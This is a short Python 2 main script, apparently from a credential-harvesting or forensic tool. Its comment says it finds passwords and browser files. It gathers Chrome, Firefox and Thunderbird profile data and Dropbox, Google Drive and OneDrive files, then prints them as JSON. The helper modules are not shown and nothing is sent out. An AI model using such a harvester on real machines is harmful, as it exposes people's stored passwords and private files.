#!/usr/bin/python


####
### Main script
##
#
##
###
####

import cloud, browserfile, config, packetizer
import os, subprocess

def main():
	# find passwords and browser files
	chrome = browserfile.chromeFinder()
	ffList = browserfile.firefoxFinder()
	thList = browserfile.thunderbirdFinder()
	browserPackList = list()
	browserPackList.append(packetizer.browserPack(chrome))
	browserPackList.append(packetizer.browserPack(ffList))
	browserPackList.append(packetizer.browserPack(thList))

	# find cloud files
	cloudPackList = list()
	dropboxList = cloud.dropbox()
	cloudPackList.append(dropboxList)

	if config.OP_SYS == "Windows":
		gdriveList = cloud.gdrive()
		onedriveList = cloud.onedrive()

		cloudPackList.append(gdriveList)
		cloudPackList.append(onedriveList)

	
	#pack all together
	print "\n\n====== JSON Formatted Values ======="
	print packetizer.browserContainer(browserPackList)
	print packetizer.cloudContainer(cloudPackList)

if __name__ == "__main__":
	main()
